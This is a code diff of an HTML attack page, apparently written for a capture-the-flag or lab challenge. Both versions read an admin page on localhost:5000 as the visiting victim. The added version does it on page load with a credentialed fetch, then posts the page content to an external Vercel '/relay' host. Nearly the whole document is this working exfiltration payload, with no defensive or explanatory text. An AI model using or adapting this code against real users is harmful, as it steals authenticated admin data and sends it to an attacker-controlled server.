@@ -1,19 +1,33 @@
 <!DOCTYPE html>
 <html>
 <body>
-    <iframe id="adminIframe" src="http://127.0.0.1:5000/admin" style="display:none;"></iframe>
+    <div id="adminContent"></div>
     <script>
-        window.addEventListener('message', function(event) {
-            if (event.origin !== 'http://localhost:5000') return; // Ensure we're getting messages from the expected origin
-            var adminContent = event.data;
-            fetch('https://redirect-git-main-seebuschs-projects.vercel.app/relay', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({ content: adminContent })
-            });
-        });
+        async function fetchAdminContent() {
+            try {
+                const response = await fetch('http://localhost:5000/admin', {
+                    method: 'GET',
+                    credentials: 'include'
+                });
+                if (response.ok) {
+                    const content = await response.text();
+                    document.getElementById('adminContent').innerText = content;
+                    // Relay the content back to your Vercel app
+                    await fetch('https://redirect-git-main-seebuschs-projects.vercel.app/relay', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({ content })
+                    });
+                } else {
+                    document.getElementById('adminContent').innerText = 'Failed to load admin content.';
+                }
+            } catch (error) {
+                document.getElementById('adminContent').innerText = 'Error fetching admin content.';
+            }
+        }
+        fetchAdminContent();
     </script>
 </body>
 </html>
